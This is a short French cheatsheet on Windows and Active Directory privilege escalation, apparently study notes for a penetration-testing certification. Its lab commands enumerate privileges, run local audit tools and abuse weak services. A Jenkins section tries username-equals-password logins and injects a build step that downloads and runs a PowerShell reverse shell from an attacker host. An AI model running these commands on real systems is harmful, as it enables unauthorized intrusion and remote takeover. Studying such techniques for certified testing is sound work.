# Cheatsheet - Privilege escalation

> [!summary] Objectif
> Mesurer les privilèges réels avant de chercher une élévation, puis passer les outils d'audit local standard — et penser aux apps web internes (Jenkins) souvent mal cloisonnées.

### Check current context

```cmd
whoami /all
```

### Check group membership (local + domaine)

```powershell
Get-LocalGroupMember -Group Administrators
Get-DomainGroupMember -Identity "Domain Admins"
```

Vérifier d'abord qu'un privilège n'est pas déjà présent avant de chercher une escalade inutile.

### Automated local checks

```powershell
. C:\AD\Tools\PowerUp.ps1 ; Invoke-AllChecks
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args
. C:\AD\Tools\PrivEscCheck.ps1 ; Invoke-PrivescCheck
```

`Invoke-AllChecks` peut renvoyer un service faible directement exploitable via `Invoke-ServiceAbuse -Name '<service>' -UserName '<DOMAIN>\<USER>'`.

### Abuse a misconfigured Jenkins instance

Jenkins n'a souvent pas de politique de mot de passe — tester `username = password`. Avec le droit *Configure* sur un build, injecter un reverse shell PowerShell dans une étape de build et lancer *Build Now* :

```powershell
powershell.exe iex (iwr http://<IP>/Invoke-PowerShellTcp.ps1 -UseBasicParsing)
```

**Link** — [[Enumeration]] · [[Cheatsheet - Lateral movement]] · [[Cheatsheet - Post-exploitation]] · [[Checklist - Méthodologie CRTP]]
